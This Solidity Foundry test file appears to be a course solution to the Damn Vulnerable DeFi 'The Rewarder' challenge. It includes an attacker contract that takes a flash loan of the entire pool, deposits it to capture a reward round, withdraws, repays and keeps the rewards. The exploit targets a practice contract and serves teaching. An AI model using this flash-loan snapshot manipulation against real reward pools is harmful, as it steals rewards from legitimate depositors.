// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "week10-11-security2/DamnValuableToken.sol";
import "week10-11-security2/the-rewarder/FlashLoanerPool.sol";
import {TheRewarderPool} from "week10-11-security2/the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "week10-11-security2/the-rewarder/RewardToken.sol";
import {AccountingToken} from "week10-11-security2/the-rewarder/AccountingToken.sol";
import {Strings} from "@openzeppelin-v4/contracts/utils/Strings.sol";

contract TheRewarderTest is Test {
    uint256 constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
    uint256 constant PLAYER_TOKENS = 100e18;

    DamnValuableToken dvt;
    FlashLoanerPool flashLoan;
    TheRewarderPool rewarder;

    RewardToken rewardToken;
    AccountingToken accountingToken;

    address attackerWallet;
    address[4] players;

    function setUp() external {
        dvt = new DamnValuableToken();
        flashLoan = new FlashLoanerPool(address(dvt));

        // Set initial dvt token balance in flash-loan pool
        dvt.transfer(address(flashLoan), TOKENS_IN_LENDER_POOL);

        rewarder = new TheRewarderPool(address(dvt));
        rewardToken = rewarder.rewardToken();
        accountingToken = rewarder.accToken();

        // alice = makeAddress("alice");
        // bob = makeAddress("bob");
        // charlie = makeAddress("charlie");
        // david = makeAddress("david");

        // Player accounts
        for (uint256 i; i < players.length; ++i) {
            // Create player
            address player = makeAddr(Strings.toString(i));

            // Cache player
            players[i] = player;

            // Transfer dvt to player
            dvt.transfer(player, PLAYER_TOKENS);

            // Approve tokens
            vm.prank(player);
            dvt.approve(address(rewarder), PLAYER_TOKENS);

            // Depost tokens
            vm.prank(player);
            rewarder.deposit(PLAYER_TOKENS);
        }

        attackerWallet = makeAddr("attackerWallet");

        _test_setUp();
    }

    function _test_setUp() internal {
        // Accounting token should have 400 tokens
        assertEq(accountingToken.totalSupply(), 400e18);

        // RewardToken should be empty to start
        assertEq(rewardToken.totalSupply(), 0);

        // Each player starts out wiht 100 tokens
        for (uint256 i; i < players.length; ++i) {
            address player = players[i];
            assertEq(accountingToken.balanceOf(player), 100e18);
        }

        skip(5 days);

        // Get rewards for each depositor
        for (uint256 i; i < players.length; ++i) {
            address player = players[i];
            vm.prank(player);
            rewarder.distributeRewards();

            // Should have 25 tokens each
            assertEq(rewardToken.balanceOf(player), 25e18);
        }

        // Reward token should have minted 100 tokens
        assertEq(rewardToken.totalSupply(), 100e18);

        // Two rounds should have occurred so far
        assertEq(rewarder.roundNumber(), 2);

        // attackerWallet should have no rewards
        assertEq(rewardToken.balanceOf(attackerWallet), 0);
    }

    function test_attack() external {
        // Deploy attacking contract
        vm.prank(attackerWallet);
        TheRewarderAttacker attacker = new TheRewarderAttacker(
            flashLoan,
            rewarder
        );

        // Advance to next round
        skip(5 days);

        // Attack
        attacker.attack();

        _checkSolved();
    }

    function _checkSolved() internal {
        // One additional round has passed
        assertEq(rewarder.roundNumber(), 3);

        // Players should still have only 25 reward tokens
        for (uint256 i; i < players.length; ++i) {
            address player = players[i];
            vm.prank(player);
            rewarder.distributeRewards();

            // Should have 25 tokens each
            assertEq(rewardToken.balanceOf(player), 25e18);
        }

        // Reward tokens were granted (greated than starting amount of 100)
        assertGt(rewardToken.totalSupply(), 100e18);

        // attackerWallet should have received all of the rewards this round
        assertGt(rewardToken.balanceOf(attackerWallet), 0);
    }
}

contract TheRewarderAttacker {
    FlashLoanerPool flashLoan;
    TheRewarderPool rewarder;
    address owner;
    DamnValuableToken dvt;

    constructor(FlashLoanerPool flashLoan_, TheRewarderPool rewarder_) {
        flashLoan = flashLoan_;
        rewarder = rewarder_;
        owner = msg.sender;
        dvt = flashLoan.liquidityToken();
    }

    function attack() external {
        console.log("attack()");

        // Request flash-loan
        uint256 amount = dvt.balanceOf(address(flashLoan));
        flashLoan.flashLoan(amount);

        // The rest of the exploit is handled in the flash-loan receiver
    }

    function receiveFlashLoan(uint256 amount) external {
        console.log("receiveFlashLoan()", amount);

        // Deposit flash-loan with rewarder
        dvt.approve(address(rewarder), amount);
        rewarder.deposit(amount);

        // Trigger payout
        rewarder.distributeRewards();

        // Withdraw tokens
        rewarder.withdraw(amount);

        // Return flash-loan
        dvt.transfer(msg.sender, amount);

        // Transfer reward tokens to owner
        RewardToken rewardToken = rewarder.rewardToken();
        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(owner, rewardBalance);
    }
}
